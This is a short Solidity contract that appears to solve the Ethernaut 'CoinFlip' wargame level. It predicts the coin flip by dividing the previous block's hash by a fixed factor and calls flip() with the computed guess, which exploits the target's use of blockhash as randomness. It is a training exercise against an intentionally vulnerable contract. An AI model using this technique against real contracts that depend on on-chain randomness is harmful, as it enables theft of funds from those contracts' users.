pragma solidity 0.5.6;

interface ETHERNAUTS {
    function flip(bool _guess) external returns (bool);
}

contract HackFlip {
    ETHERNAUTS public ethernauts;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() public {
       ethernauts  = ETHERNAUTS(your_contract_instance);
    }
    
    function doHack() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool guess = blockValue / FACTOR == 1 ? true : false;
        
        return ethernauts.flip(guess);
    }
}